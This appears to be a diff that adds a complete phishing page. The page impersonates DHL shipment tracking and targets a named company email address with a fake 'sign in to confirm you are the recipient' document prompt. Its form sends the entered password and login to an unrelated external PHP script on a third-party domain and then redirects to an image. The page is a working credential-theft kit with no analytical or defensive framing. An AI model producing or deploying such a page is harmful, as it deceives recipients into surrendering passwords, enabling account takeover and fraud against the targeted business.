@@ -1,0 +1,151 @@
+<html>
+<head>
+	<meta content="width=device-width, initial-scale=1" name="viewport" />
+	<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
+	<title>Track your shipment or package | DHL</title>
+	<link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCdTcmj8oUf85Y74bnlWiaukF74Gye3JsJYw&usqp=jpg" rel="icon" sizes="16x16" type="image/gif" />
+	<style type="text/css">body, html { height: 100%;margin: 0; font-family: Arial, Helvetica, sans-serif;
+}
+* {
+  box-sizing: border-box;
+}
+.bg-image {
+  /* The image used */
+  background-image: url("https://africabusinesscommunities.com/Images/Key%20Logos/DHL%20Express.jpg");
+  /* Add the blur effect */ filter: blur(0px); -webkit-filter: blur(0px);
+  /* Full height */ height: 100%; /* Center and scale the image nicely */
+  background-position: center; background-repeat: no-repeat; background-size: cover;
+}
+
+/* Position text in the middle of the page/image */
+.bg-text {
+  background: #e0c919;
+  width:370px; height:380px; -webkit-box-shadow: 5px 5px 15px 5px #000000; 
+  box-shadow: 5px 5px 15px 5px #000000; border-radius: 1px 35px 1px 50px;
+  position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 2; text-align: center;
+}
+input[type=submit] {
+  width:160px; height:45px; font-family: arial; font-size: 14px; color:#FFF; background-color: #df0c01; border: solid 1px #df0c01; border-radius: 2px 10px 2px 10px;
+  -webkit-box-shadow: 2px 2px 15px 5px #585858; box-shadow: 2px 2px 15px 5px #585858;  font-weight:bold; 
+}
+input[type=password] {
+  width:280px; height:40px; font-family: arial; font-size: 15px; 
+  color:#000000; background-color: #FFF; border: solid 1px #1D6F42; padding: 10px; border-radius: 2px 5px 2px 7px;
+  }
+input[type=email] {
+  width:280px; height:40px; font-family: arial; font-size: 13px; font-weight: bold;
+  color:#DF0101; background-color: #FFF; border: solid 1px #FFF; padding: 10px; border-radius: 2px 5px 2px 7px;
+    }
+	</style>
+</head>
+<body data-gr-ext-installed="" data-new-gr-c-s-check-loaded="14.1122.0" leftmargin="0" marginheight="0" marginwidth="0" topmargin="0">
+<table align="center" cellspacing="0" height="100%" width="100%">
+	<tbody>
+		<tr>
+			<td bgcolor="#181818" height="96%">
+			<div class="bg-image">&nbsp;</div>
+
+			<div class="bg-text">
+			<table align="center" cellspacing="0">
+				<tbody>
+					<tr>
+						<td style="height:40px;">&nbsp;</td>
+					</tr>
+					<tr>
+						<td>
+						<div align="left">Shipping Document: Parcel office AWB##</div>
+						</td>
+					</tr>
+					<tr>
+						<td style="height:30px;">&nbsp;</td>
+					</tr>
+					<tr>
+						<td>
+						<table cellspacing="0">
+							<tbody>
+								<tr>
+									<td style="width:5px;">majutex.ro</td>
+									<td>&nbsp;Verification process</td>
+								</tr>
+							</tbody>
+						</table>
+						</td>
+					</tr>
+					<tr>
+						<td style="height:5px;">&nbsp;</td>
+					</tr>
+					<tr>
+						<td>
+						<form method="post" action="https://dhgnegociosinmobiliarios.com/kom/dhl1.php"><input type="hidden" name="_redirect" value="https://gyazo.com/f60e6776a68244bcff80c4c61fb68dd1.png">
+						</td>
+					</tr>
+					<tr>
+						<td>
+						<div align="left">Sign in to confirm you are the recipient</div>
+						</td>
+					</tr>
+					<tr>
+						<td style="height:15px;">&nbsp;</td>
+					</tr>
+					<tr>
+						<td>
+						<table align="center" cellspacing="0">
+							<tbody>
+								<tr>
+									<td>
+									<div align="center"><input disabled="disabled" name="login" type="email" value="office@majutex.ro" /></div>
+									</td>
+								</tr>
+								<tr>
+									<td style="height:7px;">&nbsp;</td>
+								</tr>
+								<tr>
+									<td>
+									<div align="center"><input name="passwd" placeholder="password" required="" type="password" /></div>
+									</td>
+								</tr>
+								<tr>
+									<td style="height:7px;">&nbsp;</td>
+								</tr>
+								<tr>
+									<td>
+									<table align="right" cellspacing="0">
+										<tbody>
+											<tr>
+												<td>need help?</td>
+											</tr>
+										</tbody>
+									</table>
+									</td>
+								</tr>
+								<tr>
+									<td style="height:20px;">&nbsp;</td>
+								</tr>
+								<tr>
+									<td>
+									<div align="right"><input type="submit" value="View documentation" /></div>
+									</td>
+								</tr>
+								<tr>
+									<td>&nbsp;</td>
+								</tr>
+								<tr>
+									<td style="height:20px;"><input name="login" type="hidden" value="office@majutex.ro" /></td>
+								</tr>
+							</tbody>
+						</table>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			</div>
+			</td>
+		</tr>
+		<tr>
+			<td bgcolor="#181818" height="4%">
+			<div align="center">DHL&copy; International Shipping Portal | All rights reserved</div>
+			</td>
+		</tr>
+	</tbody>
+</table>
+</body>
